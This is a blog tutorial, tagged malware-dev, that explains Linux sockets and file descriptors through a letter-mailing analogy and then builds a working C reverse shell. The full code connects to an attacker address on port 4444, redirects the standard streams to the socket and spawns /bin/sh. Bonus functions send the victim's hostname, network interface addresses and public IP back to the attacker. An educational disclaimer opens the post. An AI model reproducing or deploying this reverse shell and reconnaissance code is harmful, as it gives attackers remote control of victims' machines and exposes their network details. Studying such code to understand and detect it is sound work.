---
layout: post
title:  "Reverse Shells, Linux and Letters"
date:  2024-10-17 
category: blog
tags: linux malware-dev
---

>[!Warning]
>You will not rizz your way out of jail. This post is merely for educational purposes. You (most likely) are not some soon-to-be-famous-hacker.
>

Hello cyberdenizens,

It's time to get your programming socks, yeet Metasploit through the window and curse at gcc because we'll be writing a reverse shell of our own for Linux.

Here's what we will cover in this fun little project:

* Network programming basics on Unix - What is a Socket? How do we connect and send stuff through a socket? What is a file descriptor?
* Writing our own reverse shell from scratch
* Extra spicy stuff - Expanding our piece of reverse shell to do other cool stuff

Expect to be reading a LOT of manpages.

If you want to skip right ahead to our finished binary, check this out: https://gist.github.com/renatorpn/60a8a723e8cd2c38d84d4111e3b2ba87

Note: While this blog post details the syscalls for Linux, the same basis can be applied for Windows systems.

## Anatomy of a Reverse Shell

A reverse shell is a program that connects a computer to another computer, simple as that. The victim executes the binary and the binary is responsible for establishing a session to another computer through a connection (socket). When the connection is established, the attacker computer can control the victim through shell commands.

Pretty simple, right?

There are just 3 things you will need to write a rudimentary reverse shell binary:

* A Socket
* A File Descriptor
* A Shell

### Sockets

As a Gen Z I had limited exposure to writing stuff on papers and personally I NEVER wrote a letter to someone, but for the sake of this example, let's pretend I know how mailing and letters work and bear with me for a moment.

Let's say you and your friend exchange letters back and forth. You live in Ohio and your friend lives in Leiria (2 completely real places, btw). Both of you need to have a Postal Code and an Address detailing how the mailman can find your house to deliver the letter. So you write your letter putting your friend's postal code and address in order to the mailman to deliver this letter to your friend's mailbox.

The letter is the **data** we want to send. Your friend's Postal Code and Address is the **IP:Port** combination. The mailman is **the network**. Your friend's mailbox is the **socket**.

Sockets allows the communication between two computers (or processes).

In Linux sockets are created through a syscall, you guessed, named [`socket`](https://www.man7.org/linux/man-pages/man2/socket.2.html). The man pages tells everything we need to create a socket.

```c
#include <sys/socket.h>

int socket(int _domain_, int _type_, int _protocol_);
```

A socket is composed of:

* `domain` &rarr; Specifies the domain which will be used for the communication. The domain is basically saying "which family" of protocols, we'll be using.
* `type` &rarr; The type is whether it is a Stream, Datagram, Sequential Packet, Raw or Reliable Datagram. You can read more about types [here]([Linux Networking and Network Devices APIs — The Linux Kernel documentation](https://www.kernel.org/doc/html/v5.9/networking/kapi.html)).
* `protocol` &rarr; The titular protocol. Usually there's only one protocol per domain, so assigning `0` is a pretty common call.

However, just declaring a socket won't do much. *We have to tell the socket what to do with the information*. So, if we read carefully enough, we will see that `SOCK_STREAM` must be created with a `connect()` call. Once connected we can `send()`, `receiv()`, `read()` and `write()`.

Piecing our information together and reading the manual we can have a rough idea of what we will need to write.

```c
#include <sys/socket.h>

 socket = socket(AF_INET, SOCK_STREAM, 0);
 // [...] We will figure stuff out
 int connect(int _sockfd_, const struct sockaddr _addr_, socklen_t _addrlen_);
```

Let's see what [connect(2) - Linux manual page (man7.org)](https://www.man7.org/linux/man-pages/man2/connect.2.html) tells us about connecting a socket:

> The **connect()** system call connects the socket referred to by the file descriptor *sockfd* to the address specified by *addr*.  The *addrlen* argument specifies the size of *addr*.

```c
int connect(int _sockfd_, const struct sockaddr _addr_, socklen_t _addrlen_)
```

Wait - What is a File Descriptor?

### File Descriptors

Let's go back to our mailing example.  Let's say you or your friend live on an apartment complex. Oh no! How will this letter be delivered? We only have one mailbox for the entire building!

Well - In this case the mailbox has little compartments identifying to whom that mailbox belongs to. **This is a file descriptor**.

A File Descriptor is a unique PID (handler) for any input / output. Since everything in Linux is a file, so is input / output. ;)

When we open a socket and we connect to a socket, we need to have a file descriptor for this connection. The file descriptor is pretty literally a file (and a process). This fd will deal with all I/O happening in the socket.

So our socket connection, you guessed, I/O. So we will need to create a file descriptor with our socket. Something like this:

```c
int socket_file_descriptor = socket(AF_INET, SOCK_STREAM, 0);
```

Now that we have the mailbox's direction (socket) and which mailbox to deliver (file descriptor), we can start piecing everything together.

## Putting things together

Now that we got some basics out of the way, we can have a rough idea of how we need to write this lil' binary:

* Open a network socket
* Create a file descriptor
* Connect the socket
* Shell time!

### Step 1: Open a Network Socket

As we covered before we'll need the following libraries:

* `<netinet/ip.h>`
* `<arpa/inet.h>`
* `<sys/socket.h>`

First, let's open a IPv4 TCP Socket. As we said earlier a socket needs a domain, a type and a protocol. A quick glance at the manpages says that we should use:

```c
 socket = socket(AF_INET, SOCK_STREAM, 0);
```

When working with sockets we need to have a `sockaddr` struct, so we know where to send the information, so we will need to specify the family, port and address. Easily enough, we can create a `sockaddr_in` struct with our information.

```c
const char* atk_ip = "your_ip_here";
struct sockaddr_in target_address;
target_address.sin_family = "AF_INET";
target_address.sin_port = htons("port_address_here");
inet_aton(atk_ip, &target_address.sin_addr);
```

Notice `htons`?  `htons` (host-to-network-short) converts an integer from host byte order to network byte order. We need this because host byte order is little endian, while network byte order is big endian. This makes sure numbers stored in memory go out in network byte order. Network byte order are always big endian.

`inet_aton` converts IP addresses and port from string to binary, because that's what your network card expects to send.

### Step 2: Create a File Descriptor

 When calling `socket()` we need to specify 3 parameters: `sin_family`,  `sock_type` and `protocol_type`. We pass 0 as it means `IPPROTO_TCP` or `IPPROTO_UDP` depending on the `sin_family` used.

```c
int socket_file_descriptor = socket(AF_INET, SOCK_STREAM, 0);
```

### Step 3: Connect the Socket

With a file descriptor created we just need to connect to our attacker host so our our computers can talk to each other. So let's call [connect()](https://www.man7.org/linux/man-pages/man2/connect.2.html)! Connect expects a file descriptor, the sock address and the size of that address.

```c
connect(socket_file_descriptor, (struct sockaddr *) &target_address, sizeof(target_address))
```

### Step 4: Shell time

In Linux when we're working with the shell there are 3 standard streams: `stdin`, `stdout` and `stderr`. In order for the attacker (us) to read the information from these streams, we need to send that to our file descriptor.

 To achieve this you can either use `dup2(int old_file_descriptor, int new_file_descriptor)` for each one of these streams or just use a for loop:

```c
for (int i = 0; i < 3; i++){
        dup2(socket_file_descriptor, i);
    }
```

Once we have the connection and we're redirecting the streams to the file descriptor, we can now execute our commands. We use the `execve(const char *pathname, char *const _Nullable argv[]v, char *const _Nullable envp[])`. This function executes a new program in the context of the calling process (the program we just wrote in this case). In depth:

* It replaces the current process with the new process;
* PID of our program stays the same, but the content is entirely replaced;
* All file descriptors that are opened are preserved;

```c
execve("/bin/sh", NULL, NULL);
```

[execve(2) - Linux manual page (man7.org)](https://www.man7.org/linux/man-pages/man2/execve.2.html)

## Talk is cheap, show me the code

Enough yapping, here's the full code:

```c
#include <stdio.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main(){
    const char* atk_ip = "10.10.10.3";

    // Preparing the target
    // sockaddr_in data struct to represent socket addresses
    struct sockaddr_in target_address;
    // sin_family identifies the address family or socket format
    // AF_INET = IPv4
    // AF_INET6 = IPv6
    target_address.sin_family = AF_INET;
    // htons = makes sure numbers stored in memory in network byte order
    // ensures big and little endian compatibility
    target_address.sin_port = htons(4444);
    inet_aton(atk_ip, &target_address.sin_addr);

    // Creating the socket
    int socket_file_descriptor = socket(AF_INET, SOCK_STREAM, 0);

    // Connecting
    connect(socket_file_descriptor, (struct sockaddr *) &target_address, sizeof(target_address));

    // Redirecting stdin, stdout and stderr
    for (int i = 0; i < 3; i++){
        dup2(socket_file_descriptor, i);
    }

    // Spawn shell
    execve("/bin/sh", NULL, NULL);
}
```

## Bonus - Expanding our Binary

Now that we've got the basics down, we can let our imagination fill in the gaps.

What if I wanted to get the victim's information when connecting back to the attacker? Say, let's get the victim's hostname!

Let's say we want to grab the victim's hostname, we just need to write a simple function:

```c
void get_hostname_info(int sock){
    char hostname[1024];
    char ip_addr[INET_ADDRSTRLEN];
    struct hostent *host_entry;

    gethostname(hostname, sizeof(hostname));
    char message[1024];
    snprintf(message, sizeof(message), "Hostname: %s\n", hostname);
    send(sock, message, strlen(message), 0);
}
```

### Getting Network Interface Information

Now, if we wanted to list all the network interfaces attached to the machine, that would need to have a little bit more complex function. We would need to get the interfaces, loop through them to get the IPv4 information, neatly send that information to the socket.

This is a little bit tricky because we would need to have a Linked List (damn DSA), but this is how I'd do it:

```c
void get_ipaddr_info(int sock){
    struct ifaddrs *interfaces, *temp_addr;
    char message[10000];
    int total_length = 0;

    // Get the list of network interfaces
    if (getifaddrs(&interfaces) == -1) {
        perror("getifaddrs failed");
        return;
    }

    // Loop through the interfaces
    for (temp_addr = interfaces; temp_addr != NULL; temp_addr = temp_addr->ifa_next) {
        // Check if the interface has an address and is IPv4
        if (temp_addr->ifa_addr != NULL && temp_addr->ifa_addr->sa_family == AF_INET) {
            char ip[INET_ADDRSTRLEN];
            // Get IP address
            struct sockaddr_in *sockaddr_ipv4 = (struct sockaddr_in *)temp_addr->ifa_addr;
            inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), ip, INET_ADDRSTRLEN);
            int length = snprintf(message + total_length, sizeof(message) - total_length, "%s: %s\n", temp_addr->ifa_name, ip);
            if (length < 0 || total_length + length >= sizeof(message)) {
                break;
            }
            total_length += length;
        }
    }
    
    // Send the IP addresses to the socket
    if (total_length > 0) {
        send(sock, message, strlen(message), 0);
    } else {
        char *error;
        error = "No interface \n";
        send(sock, error, strlen(error), 0);
    }

    freeifaddrs(interfaces); // Free the linked list
}
```

### Getting the Victim's Public IP

Gettin a Victim's Public IP is a little bit trickier, but it shares the same premise we've seen before:

* Open sockets for connection
* Have file descriptors to get the information from the sockets

However we need to externally query the Public IP info. That means we need to perform a HTTP Request to a service like [ipinfo.io](https://ipinfo.io). We will need to do the following:

* Use [netdb.h](https://www.gnu.org/software/libc/manual/html_node/Networks-Database.html) to resolve the server DNS name
* Parse the response back to our socket

```c
void get_external_ip(int sock) {
    int web_sock;
    struct sockaddr_in server;
    struct hostent *host;
    char http_request[] = "GET /ip HTTP/1.1\r\nHost: ipinfo.io\r\nConnection: close\r\n\r\n";
    char response[4096];
    char external_ip[100];

    // Resolve hostname (ipinfo.io)
    host = gethostbyname("ipinfo.io");
    if (host == NULL) {
        send(sock, "Failed to resolve ipinfo.io\n", 28, 0);
        return;
    }

    // Create a socket for the HTTP request
    web_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (web_sock == -1) {
        send(sock, "Failed to create socket\n", 24, 0);
        return;
    }

    // Set up the server structure
    server.sin_family = AF_INET;
    server.sin_port = htons(80);
    memcpy(&server.sin_addr, host->h_addr, host->h_length);

    // ipinfo.io server
    if (connect(web_sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        send(sock, "Failed to connect to ipinfo.io\n", 31, 0);
        close(web_sock);
        return;
    }

    if (send(web_sock, http_request, strlen(http_request), 0) < 0) {
        send(sock, "Failed to send HTTP request\n", 28, 0);
        close(web_sock);
        return;
    }

    int received = recv(web_sock, response, sizeof(response) - 1, 0);
    if (received < 0) {
        send(sock, "Failed to receive HTTP response\n", 32, 0);
        close(web_sock);
        return;
    }
    response[received] = '\0';

    char *ip_start = strstr(response, "\r\n\r\n"); // Skip HTTP headers
    if (ip_start != NULL) {
        ip_start += 4; // Move past the "\r\n\r\n"
        snprintf(external_ip, sizeof(external_ip), "External IP: %s\n", ip_start);
        send(sock, external_ip, strlen(external_ip), 0);
    } else {
        send(sock, "Failed to extract external IP\n", 30, 0);
    }

    close(web_sock);
}
```

## Conclusion

Breaking a problem into pieces is essential to understand the underlying concepts and how to apply them in unrelated tasks. The next time we need to write a piece of software that needs to interact directly with syscalls and network, we know now what a socket and file descriptor is and how to apply these concepts. We also picked up a pretty healthy habit of reading manpages and using those informations in a way that makes sense to us.

Writing a reverse shell can have N layers of complexity as we move torward different objectives. A logical progression of writing a reverse shell would be deploying all the C code we wrote to byte code, also known as [shellcoding](https://en.wikipedia.org/wiki/Shellcode).

There are no shortcuts to knowledge - there are only directions to it. Take your time and take your notes.

I hope you had fun reading this article and see you on my next (educational) mischievous activity.

## References

* [Malware Development For Ethical Hackers - Packt Publishing](https://github.com/PacktPublishing/Malware-Development-for-Ethical-Hackers)
* [Reverse Shells by cocomelonc](https://cocomelonc.github.io/tutorial/2021/09/11/reverse-shells.html)
* [Programming Linux sockets, Part 1: Using TCP/IP - IBM](https://developer.ibm.com/tutorials/l-sock/)
* [Understanding Unix Sockets - geeksforgeeks](https://www.geeksforgeeks.org/understanding-unix-sockets/)
* [How to use the POSIX standard file descriptors stdin, stdout and stderr in Bash jw bargsten](https://bargsten.org/bash/explanation-standard-file-descriptors/)